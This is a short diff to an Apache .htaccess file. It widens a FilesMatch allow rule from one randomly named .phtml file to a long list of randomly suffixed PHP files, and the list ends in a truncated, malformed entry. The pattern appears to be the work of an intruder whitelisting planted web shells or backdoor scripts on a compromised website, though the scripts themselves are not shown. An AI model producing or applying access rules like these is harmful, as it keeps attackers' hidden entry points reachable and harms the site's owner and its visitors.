@@ -84,7 +84,7 @@ Options -Indexes
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(68cce5272b5de.phtml)$"> 
+<FilesMatch "^(68cce5272b5de.phtml|index.php|article_khia.php|author_1hwx.php|article_4e63.php|author_nynq.php|article_ipp6.php|author_7g7d.php|article_64vq.php|author_rrq4.php|editor_1u36.php|article_eelh.php|author_6zra.php|article_gbxd.php|author_85ar.php|editor_wiyr.php|review_c5wx.php|article_9hsq.ph|)$"> 
 Order Allow,Deny 
 Allow from all 
 </FilesMatch>
